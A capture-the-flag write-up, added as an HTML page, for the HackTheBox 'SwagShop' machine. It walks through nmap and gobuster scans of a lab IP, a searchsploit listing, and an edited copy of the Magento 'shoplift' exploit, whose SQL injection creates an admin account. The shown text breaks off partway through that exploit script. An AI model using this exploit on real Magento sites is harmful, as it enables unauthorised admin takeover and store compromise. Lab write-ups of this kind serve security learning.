@@ -1,0 +1,510 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>pwncone.io</title>
+    <link rel="stylesheet" href="../../../../css/style.css">
+  </head>
+
+<body>
+
+<section>
+    <writeup>
+        <h1><strong>hackthebox SwagShop</strong></h1>
+        <em>Released: May 2019 / Pwned: June 24th 2019 - [+] Solved whilst Active</em><br>
+        <br>
+        <img alt="images\2-1.png" src="images/2-1.png"><br>
+        <br>
+        This machine seemed to slam me in the face at every turn, which didn't do much for my concentration considering this box was supposed to be “very easy". The steps all look so logical when laid out in a write-up but when you're switching between scripts and re-writing bits of what, you think, are all the valid exploits you end up getting pretty lost in it all. Got there in the end though :)<br>
+        <br>
+        <a id="h3-1" name="h3-1"></a><strong></strong>
+        <h4><strong>Summary</strong></h4>
+        • Navigate to 80/http<br>
+        • Gobuster both <code>http://10.10.10.140</code> and <code>http://10.10.10.140/index.php</code> and find some interesting URLs<br>
+        • Modify exploit <code>37977.py</code> and get admin credentials<br>
+        • Upload the Filesystem plugin via panel at <code>/downloader</code> and get reverse shell by modifying <code>install.php</code> at <code>/index.php/admin</code> using Filesystem plugin<br>
+        • Upgrade to an interactive reverse shell using python3<br>
+        • Run <code>vi</code> with <code>sudo</code> permissions on a file in <code>/var/www/html/</code> and escape to a root shell<br>
+        <br>
+        <a id="h2-1" name="h2-1"></a><strong></strong>
+        <h2><strong>1) Nmap</strong></h2><br>
+        Initial scan:<br>
+        <code>nmap -sC -sV -O -oN nmap/initial.txt 10.10.10.140</code><br>
+        <br>
+        -sC default scripts<br>
+        -sV service enumeration<br>
+        -O OS detection<br>
+        -oN default output<br>
+        <br>
+        Results:<br>
+            <div class="codebox">
+                root@gotham:~/ctf/swagshop#&nbsp;mkdir&nbsp;nmap<br>
+                root@gotham:~/ctf/swagshop#&nbsp;nmap&nbsp;-sC&nbsp;-sV&nbsp;-O&nbsp;-oN&nbsp;nmap/initial.txt&nbsp;10.10.10.140<br>
+                ...<br>
+                Host&nbsp;is&nbsp;up&nbsp;(0.039s&nbsp;latency).<br>
+                Not&nbsp;shown:&nbsp;998&nbsp;closed&nbsp;ports<br>
+                PORT&nbsp;&nbsp;&nbsp;STATE&nbsp;SERVICE&nbsp;VERSION<br>
+                22/tcp&nbsp;open&nbsp;&nbsp;ssh&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OpenSSH&nbsp;7.2p2&nbsp;Ubuntu&nbsp;4ubuntu2.8&nbsp;(Ubuntu&nbsp;Linux;&nbsp;protocol&nbsp;2.0)<br>
+                |&nbsp;ssh-hostkey:&nbsp;<br>
+                |&nbsp;&nbsp;&nbsp;2048&nbsp;b6:55:2b:d2:4e:8f:a3:81:72:61:37:9a:12:f6:24:ec&nbsp;(RSA)<br>
+                |&nbsp;&nbsp;&nbsp;256&nbsp;2e:30:00:7a:92:f0:89:30:59:c1:77:56:ad:51:c0:ba&nbsp;(ECDSA)<br>
+                |_&nbsp;&nbsp;256&nbsp;4c:50:d5:f2:70:c5:fd:c4:b2:f0:bc:42:20:32:64:34&nbsp;(ED25519)<br>
+                80/tcp&nbsp;open&nbsp;&nbsp;http&nbsp;&nbsp;&nbsp;&nbsp;Apache&nbsp;httpd&nbsp;2.4.18&nbsp;((Ubuntu))<br>
+                |_http-server-header:&nbsp;Apache/2.4.18&nbsp;(Ubuntu)<br>
+                |_http-title:&nbsp;Home&nbsp;page<br>
+                No&nbsp;exact&nbsp;OS&nbsp;matches&nbsp;for&nbsp;host&nbsp;(If&nbsp;you&nbsp;know&nbsp;what&nbsp;OS&nbsp;is&nbsp;running&nbsp;on&nbsp;it,&nbsp;see&nbsp;https://nmap.org/submit/&nbsp;).<br>
+                ...
+            </div>
+        </div><br>
+        <br>
+        A full port scan didn't reveal anything new.<br>
+        <br>
+        • 22/ssh - there's a username enumeration exploit for this OpenSSH version but it ends up being no use<br>
+        • 80/http - this is the only other place to look, so that's where you should head<br>
+        <br>
+        <a id="h2-2" name="h2-2"></a><strong></strong>
+        <h2><strong>2) 80/http</strong></h2><br>
+        <code>http://10.10.10.140</code><br>
+        <img alt="images\2-2.png" src="images/2-2.png"><br>
+        There's some swag to buy! And a great big ‘Magento’ logo staring us in the face.<br>
+        <br>
+        One thing to note about this site is that if you follow any of the links, to <em>‘5x Hack the Box Sticker’</em> for example, you'll notice that appended to the end of the IP/hostname is <code>/index.php</code><br>
+        <img alt="images\2-3.png" src="images/2-3.png"><br>
+        <br>
+        This isn't immediately apparent when you first visit the site as all you'll see in the URL bar is the hostname/IP.<br>
+        This is something to take note of when running scripts against the target, as <code>http://10.10.10.140</code> and <code>http://10.10.10.140/index.php</code> will produce different results.<br>
+        <br>
+        A lesson to learn from this is that you should briefly, before running any scripts, check the site out yourself and watch carefully for anything of note.<br>
+        <br>
+        <a id="h3-2" name="h3-2"></a><strong></strong>
+        <h3><strong>2a) gobuster</strong></h3><br>
+        Running <code>gobuster</code> against <code>http://10.10.10.140</code> finds some interesting URLs for us.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/swagshop/80http#&nbsp;gobuster&nbsp;-e&nbsp;-u&nbsp;http://10.10.10.140/&nbsp;-w&nbsp;/usr/share/seclists/Discovery/Web-Content/common.txt&nbsp;-o&nbsp;gb-common.txt<br>
+                =====================================================<br>
+                Gobuster&nbsp;v2.0.1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OJ&nbsp;Reeves&nbsp;(@TheColonial)<br>
+                =====================================================<br>
+                [+]&nbsp;Mode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;dir<br>
+                [+]&nbsp;Url/Domain&nbsp;&nbsp;&nbsp;:&nbsp;http://10.10.10.140/<br>
+                [+]&nbsp;Threads&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;10<br>
+                [+]&nbsp;Wordlist&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;/usr/share/seclists/Discovery/Web-Content/common.txt<br>
+                [+]&nbsp;Status&nbsp;codes&nbsp;:&nbsp;200,204,301,302,307,403<br>
+                [+]&nbsp;Expanded&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;true<br>
+                [+]&nbsp;Timeout&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;10s<br>
+                =====================================================<br>
+                2019/06/21&nbsp;11:18:53&nbsp;Starting&nbsp;gobuster<br>
+                =====================================================<br>
+                http://10.10.10.140/.hta&nbsp;(Status:&nbsp;403)<br>
+                http://10.10.10.140/.htaccess&nbsp;(Status:&nbsp;403)<br>
+                http://10.10.10.140/.htpasswd&nbsp;(Status:&nbsp;403)<br>
+                http://10.10.10.140/app&nbsp;(Status:&nbsp;301)<br>
+                http://10.10.10.140/downloader&nbsp;(Status:&nbsp;301)<br>
+                http://10.10.10.140/errors&nbsp;(Status:&nbsp;301)<br>
+                http://10.10.10.140/favicon.ico&nbsp;(Status:&nbsp;200)<br>
+                http://10.10.10.140/includes&nbsp;(Status:&nbsp;301)<br>
+                http://10.10.10.140/index.php&nbsp;(Status:&nbsp;200)<br>
+                http://10.10.10.140/js&nbsp;(Status:&nbsp;301)<br>
+                http://10.10.10.140/lib&nbsp;(Status:&nbsp;301)<br>
+                http://10.10.10.140/media&nbsp;(Status:&nbsp;301)<br>
+                http://10.10.10.140/pkginfo&nbsp;(Status:&nbsp;301)<br>
+                http://10.10.10.140/server-status&nbsp;(Status:&nbsp;403)<br>
+                http://10.10.10.140/shell&nbsp;(Status:&nbsp;301)<br>
+                http://10.10.10.140/skin&nbsp;(Status:&nbsp;301)<br>
+                http://10.10.10.140/var&nbsp;(Status:&nbsp;301)<br>
+                =====================================================<br>
+                2019/06/21&nbsp;11:19:19&nbsp;Finished<br>
+                =====================================================<br>
+            </div>
+        </div><br>
+        <br>
+        Key results to note here are:<br>
+        • <code>http://10.10.10.140/downloader</code> - location of the Magento Connect Manager login portal<br>
+        • <code>http://10.10.10.140/app</code> - a directory listing of what looks to be the source code of the entire app<br>
+        ◇ in <code>/app/etc/local.xml</code> - you'll find root credentials for the mysql database, but they're not of any use<br>
+        <br>
+        Running gobuster against <code>http://10.10.10.140/index.php</code> also finds some interesting URLs:<br>
+            <div class="codebox">
+                root@gotham:~/ctf/swagshop/80http#&nbsp;gobuster&nbsp;-e&nbsp;-u&nbsp;http://10.10.10.140/index.php&nbsp;-w&nbsp;/usr/share/seclists/Discovery/Web-Content/common.txt&nbsp;-o&nbsp;gb-common-index.txt<br>
+                <br>
+                =====================================================<br>
+                Gobuster&nbsp;v2.0.1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OJ&nbsp;Reeves&nbsp;(@TheColonial)<br>
+                =====================================================<br>
+                [+]&nbsp;Mode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;dir<br>
+                [+]&nbsp;Url/Domain&nbsp;&nbsp;&nbsp;:&nbsp;http://10.10.10.140/index.php/<br>
+                [+]&nbsp;Threads&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;10<br>
+                [+]&nbsp;Wordlist&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;/usr/share/seclists/Discovery/Web-Content/common.txt<br>
+                [+]&nbsp;Status&nbsp;codes&nbsp;:&nbsp;200,204,301,302,307,403<br>
+                [+]&nbsp;Expanded&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;true<br>
+                [+]&nbsp;Timeout&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;10s<br>
+                =====================================================<br>
+                2019/06/24&nbsp;18:29:20&nbsp;Starting&nbsp;gobuster<br>
+                =====================================================<br>
+                http://10.10.10.140/index.php/0&nbsp;(Status:&nbsp;200)<br>
+                http://10.10.10.140/index.php/Home&nbsp;(Status:&nbsp;200)<br>
+                http://10.10.10.140/index.php/admin&nbsp;(Status:&nbsp;200)<br>
+                http://10.10.10.140/index.php/api&nbsp;(Status:&nbsp;200)<br>
+                http://10.10.10.140/index.php/catalog&nbsp;(Status:&nbsp;302)<br>
+                http://10.10.10.140/index.php/checkout&nbsp;(Status:&nbsp;302)<br>
+                http://10.10.10.140/index.php/cms&nbsp;(Status:&nbsp;200)<br>
+                http://10.10.10.140/index.php/contacts&nbsp;(Status:&nbsp;200)<br>
+                http://10.10.10.140/index.php/core&nbsp;(Status:&nbsp;200)<br>
+                http://10.10.10.140/index.php/enable-cookies&nbsp;(Status:&nbsp;200)<br>
+                http://10.10.10.140/index.php/home&nbsp;(Status:&nbsp;200)<br>
+                http://10.10.10.140/index.php/install&nbsp;(Status:&nbsp;302)<br>
+                http://10.10.10.140/index.php/wishlist&nbsp;(Status:&nbsp;302)<br>
+                =====================================================<br>
+                2019/06/24&nbsp;18:41:16&nbsp;Finished<br>
+                =====================================================<br>
+            </div>
+        </div><br>
+        <br>
+        The useful result is - <code>http://10.10.10.140/index.php/admin</code> - which is the location of the Magento Admin Panel.<br>
+        <br>
+        <a id="h3-3" name="h3-3"></a><strong></strong>
+        <h3><strong>2b) searchsploit Magento</strong></h3><br>
+        Magento is an online shop written in PHP. And there are exploits for it.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/swagshop/80http#&nbsp;searchsploit&nbsp;magento<br>
+                -----------------------------------------------------------------------------------------------------------------&nbsp;<br>
+                &nbsp;Exploit&nbsp;Title&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;Path<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;(/usr/share/exploitdb/)<br>
+                -----------------------------------------------------------------------------------------------------------------&nbsp;<br>
+                Magento&nbsp;1.2&nbsp;-&nbsp;'/app/code/core/Mage/Admin/Model/Session.php?login['Username']'&nbsp;Cross-Site&nbsp;Scripting&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;exploits/php/webapps/32808.txt<br>
+                Magento&nbsp;1.2&nbsp;-&nbsp;'/app/code/core/Mage/Adminhtml/controllers/IndexController.php?email'&nbsp;Cross-Site&nbsp;Scripting&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;exploits/php/webapps/32809.txt<br>
+                Magento&nbsp;1.2&nbsp;-&nbsp;'downloader/index.php'&nbsp;Cross-Site&nbsp;Scripting&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;exploits/php/webapps/32810.txt<br>
+                Magento&nbsp;&lt;&nbsp;2.0.6&nbsp;-&nbsp;Arbitrary&nbsp;Unserialize&nbsp;/&nbsp;Arbitrary&nbsp;Write&nbsp;File&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;exploits/php/webapps/39838.php<br>
+                Magento&nbsp;CE&nbsp;&lt;&nbsp;1.9.0.1&nbsp;-&nbsp;(Authenticated)&nbsp;Remote&nbsp;Code&nbsp;Execution&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;exploits/php/webapps/37811.py<br>
+                Magento&nbsp;Server&nbsp;MAGMI&nbsp;Plugin&nbsp;-&nbsp;Multiple&nbsp;Vulnerabilities&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;exploits/php/webapps/35996.txt<br>
+                Magento&nbsp;Server&nbsp;MAGMI&nbsp;Plugin&nbsp;0.7.17a&nbsp;-&nbsp;Remote&nbsp;File&nbsp;Inclusion&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;exploits/php/webapps/35052.txt<br>
+                Magento&nbsp;eCommerce&nbsp;-&nbsp;Local&nbsp;File&nbsp;Disclosure&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;exploits/php/webapps/19793.txt<br>
+                Magento&nbsp;eCommerce&nbsp;-&nbsp;Remote&nbsp;Code&nbsp;Execution&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;exploits/xml/webapps/37977.py<br>
+                eBay&nbsp;Magento&nbsp;1.9.2.1&nbsp;-&nbsp;PHP&nbsp;FPM&nbsp;XML&nbsp;eXternal&nbsp;Entity&nbsp;Injection&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;exploits/php/webapps/38573.txt<br>
+                eBay&nbsp;Magento&nbsp;CE&nbsp;1.9.2.1&nbsp;-&nbsp;Unrestricted&nbsp;Cron&nbsp;Script&nbsp;(Code&nbsp;Execution&nbsp;/&nbsp;Denial&nbsp;of&nbsp;Service)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;exploits/php/webapps/38651.txt<br>
+                -----------------------------------------------------------------------------------------------------------------&nbsp;<br>
+                Shellcodes:&nbsp;No&nbsp;Result
+            </div>
+        </div><br>
+        <br>
+        These exploits fooled me originally because at first glance they don't appear suitable.<br>
+        That's not true. We can use <code>37977.py</code> to get login credentials for the admin panels.<br>
+        <br>
+        <a id="h3-4" name="h3-4"></a><strong></strong>
+        <h3><strong>2c) 37977.py</strong></h3><br>
+        This is the exploit we need - <a href="https://www.exploit-db.com/exploits/37977">https://www.exploit-db.com/exploits/37977</a><br>
+        <br>
+        Whilst the title of this script does say ‘Remote Code Execution’, if you read the contents of the script you'll learn that what it actually does is create an admin user with the credentials <code>forme / forme</code> (via remote code execution).<br>
+        <br>
+        Parts of the script need editing.<br>
+        <br>
+        You'll see from this line:<br>
+            <div class="codebox">
+                target_url&nbsp;=&nbsp;target&nbsp;+&nbsp;<span style="color:#3ad900;font-weight:400">"/admin/Cms_Wysiwyg/directive/index/"</span>
+            </div>
+        </div><br>
+        that the exploit is targeting <code>/admin/Cms_Wysiwyg/directive/index/</code><br>
+        <br>
+        We know from our gobuster scan earlier that the <code>/admin</code> directory is located <code>http://10.10.10.140/index.php</code><br>
+        So this line:<br>
+            <div class="codebox">
+                target&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"http://target.com/"</span>
+            </div>
+        </div><br>
+        <br>
+        Needs to be modified to this:<br>
+            <div class="codebox">
+                target&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"http://10.10.10.140/index.php"</span>
+            </div>
+        </div><br>
+        <br>
+        You'll also need to comment out or delete the exploit info at the top and bottom of the script.<br>
+        My whole exploit looked like this:<br>
+            <div class="codebox">
+                <span style="color:#3ad900;font-weight:400">'''<br>
+                ////////////////////////<br>
+                ///&nbsp;Overview:<br>
+                ////////////////////////<br>
+                <br>
+                Magento&nbsp;shoplift&nbsp;bug&nbsp;originally&nbsp;discovered&nbsp;by&nbsp;CheckPoint&nbsp;team&nbsp;(http://blog.checkpoint.com/2015/04/20/analyzing-magento-vulnerability/)<br>
+                This&nbsp;python&nbsp;script&nbsp;developed&nbsp;by&nbsp;joren&nbsp;but&nbsp;it&nbsp;was&nbsp;having&nbsp;some&nbsp;bug&nbsp;because&nbsp;of&nbsp;which&nbsp;it&nbsp;was&nbsp;not&nbsp;working&nbsp;properly.<br>
+                If&nbsp;magento&nbsp;version&nbsp;is&nbsp;vulnerable,&nbsp;this&nbsp;script&nbsp;will&nbsp;create&nbsp;admin&nbsp;account&nbsp;with&nbsp;username&nbsp;forme&nbsp;and&nbsp;password&nbsp;forme<br>
+                <br>
+                ////////////////<br>
+                ///&nbsp;&nbsp;POC&nbsp;&nbsp;&nbsp;////<br>
+                ///////////////<br>
+                Exploit&nbsp;script&nbsp;starts&nbsp;here<br>
+                ///////////////////<br>
+                '''</span><br>
+                <span style="color:#0088ff;font-weight:400">#Thanks&nbsp;to</span><br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;Zero&nbsp;cool,&nbsp;code&nbsp;breaker&nbsp;ICA,&nbsp;Team&nbsp;indishell,&nbsp;my&nbsp;father&nbsp;,&nbsp;rr&nbsp;mam,&nbsp;jagriti&nbsp;and&nbsp;DON&nbsp;&nbsp;</span><br>
+                <span style="color:#333333;font-weight:400">import</span>&nbsp;requests<br>
+                <span style="color:#333333;font-weight:400">import</span>&nbsp;base64<br>
+                <span style="color:#333333;font-weight:400">import</span>&nbsp;sys<br>
+                <br>
+                target&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"http://10.10.10.140/index.php"</span><br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">if</span>&nbsp;<span style="color:#ff9d00;font-weight:700">not</span>&nbsp;target.startswith(<span style="color:#3ad900;font-weight:400">"http"</span>):<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;target&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"http://"</span>&nbsp;+&nbsp;target<br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">if</span>&nbsp;target.endswith(<span style="color:#3ad900;font-weight:400">"/"</span>):<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;target&nbsp;=&nbsp;target[:-<span style="color:#ff0044;font-weight:400">1</span>]<br>
+                <br>
+                target_url&nbsp;=&nbsp;target&nbsp;+&nbsp;<span style="color:#3ad900;font-weight:400">"/admin/Cms_Wysiwyg/directive/index/"</span><br>
+                <br>
+                q=<span style="color:#3ad900;font-weight:400">"""<br>
+                SET&nbsp;@SALT&nbsp;=&nbsp;'rp';<br>
+                SET&nbsp;@PASS&nbsp;=&nbsp;CONCAT(MD5(CONCAT(&nbsp;@SALT&nbsp;,&nbsp;'{password}')&nbsp;),&nbsp;CONCAT(':',&nbsp;@SALT&nbsp;));<br>
+                SELECT&nbsp;@EXTRA&nbsp;:=&nbsp;MAX(extra)&nbsp;FROM&nbsp;admin_user&nbsp;WHERE&nbsp;extra&nbsp;IS&nbsp;NOT&nbsp;NULL;<br>
+                INSERT&nbsp;INTO&nbsp;`admin_user`&nbsp;(`firstname`,&nbsp;`lastname`,`email`,`username`,`password`,`created`,`lognum`,`reload_acl_flag`,`is_active`,`extra`,`rp_token`,`rp_token_created_at`)&nbsp;VALUES&nbsp;('Firstname','Lastname','email@example.com','{username}',@PASS,NOW(),0,0,1,@EXTRA,NULL,&nbsp;NOW());<br>
+                INSERT&nbsp;INTO&nbsp;`admin_role`&nbsp;(parent_id,tree_level,sort_order,role_type,user_id,role_name)&nbsp;VALUES&nbsp;(1,2,0,'U',(SELECT&nbsp;user_id&nbsp;FROM&nbsp;admin_user&nbsp;WHERE&nbsp;username&nbsp;=&nbsp;'{username}'),'Firstname');<br>
+                """</span><br>
+                <br>
+                <br>
+                query&nbsp;=&nbsp;q.replace(<span style="color:#3ad900;font-weight:400">"\n"</span>,&nbsp;<span style="color:#3ad900;font-weight:400">""</span>).format(username=<span style="color:#3ad900;font-weight:400">"forme"</span>,&nbsp;password=<span style="color:#3ad900;font-weight:400">"forme"</span>)<br>
+                pfilter&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"popularity[from]=0&amp;popularity[to]=3&amp;popularity[field_expr]=0);{0}"</span>.format(query)<br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ&nbsp;decoded&nbsp;is{{block&nbsp;type=Adminhtml/report_search_grid&nbsp;output=getCsvFile}}</span><br>
+                r&nbsp;=&nbsp;requests.post(target_url,&nbsp;<br>
